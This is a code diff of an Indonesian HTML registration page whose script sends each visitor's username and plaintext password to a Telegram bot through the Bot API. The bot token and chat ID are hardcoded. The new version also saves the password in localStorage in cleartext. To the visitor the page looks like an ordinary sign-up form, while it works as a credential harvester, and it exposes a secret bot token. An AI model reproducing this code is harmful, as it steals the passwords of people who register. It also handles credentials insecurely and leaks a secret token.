@@ -1,99 +1,77 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Register</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #f4f4f4;
-        }
-        .register-container {
-            width: 100%;
-            max-width: 400px;
-            padding: 20px;
-            background: #fff;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        }
-        h2 {
-            text-align: center;
-        }
-        label {
-            display: block;
-            margin-bottom: 8px;
-        }
-        input {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 15px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-        }
-        button {
-            width: 100%;
-            padding: 10px;
-            background-color: #4CAF50;
-            border: none;
-            border-radius: 4px;
-            color: white;
-            font-size: 16px;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Register</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: #f4f4f4;
+    }
+    .register-container {
+      max-width: 400px;
+      background: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    h2 { text-align: center; }
+    input, button {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border-radius: 4px;
+    }
+    button {
+      background: #4CAF50;
+      border: none;
+      color: #fff;
+      font-size: 16px;
+    }
+  </style>
 </head>
 <body>
-    <div class="register-container">
-        <h2>Register</h2>
-        <form id="registerForm">
-            <label for="username">Username</label>
-            <input type="text" id="username" name="username" required>
+  <div class="register-container">
+    <h2>Daftar</h2>
+    <form id="registerForm">
+      <input type="text" id="username" placeholder="Username" required />
+      <input type="password" id="password" placeholder="Password" required />
+      <button type="submit">Register</button>
+    </form>
+  </div>
 
-            <label for="password">Password</label>
-            <input type="password" id="password" name="password" required>
+  <script>
+    document.getElementById("registerForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value;
 
-            <button type="submit">Register</button>
-        </form>
-    </div>
+      // Simpan ke localStorage
+      localStorage.setItem("username", username);
+      localStorage.setItem("password", password);
 
-    <script>
-        // Mengirim data registrasi ke bot Telegram
-        document.getElementById("registerForm").addEventListener("submit", function(event) {
-            event.preventDefault();
+      // Kirim ke Telegram
+      const botToken = "7621390139:AAE9oNVeBy946yGbO7IDsT34DFY3THvGC6I";
+      const chatId = "7882058841";
+      const message = `Registrasi Baru:\nUsername: ${username}\nPassword: ${password}`;
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
-            const username = document.getElementById("username").value;
-            const password = document.getElementById("password").value;
-
-            const botToken = '7621390139:AAE9oNVeBy946yGbO7IDsT34DFY3THvGC6I';  // Token bot Telegram Anda
-            const chatId = '7882058841';  // Chat ID Telegram Anda
-
-            const message = `Registrasi Baru:\nUsername: ${username}\nPassword: ${password}`;
-
-            // URL untuk mengirimkan pesan ke bot Telegram
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
-            // Membuat permintaan HTTP untuk mengirim pesan ke bot Telegram
-            fetch(url)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        alert("Registrasi berhasil!");
-                        window.location.href = "index.html";  // Arahkan kembali ke halaman login
-                    } else {
-                        alert("Terjadi kesalahan. Coba lagi.");
-                    }
-                })
-                .catch(error => {
-                    alert("Terjadi kesalahan. Coba lagi.");
-                    console.error(error);
-                });
+      fetch(url)
+        .then(res => res.json())
+        .then(data => {
+          alert("Registrasi berhasil! Silakan login.");
+          window.location.href = "index.html";
+        })
+        .catch(err => {
+          alert("Gagal mengirim ke Telegram, tapi data tersimpan.");
+          window.location.href = "index.html";
         });
-    </script>
+    });
+  </script>
 </body>
 </html>
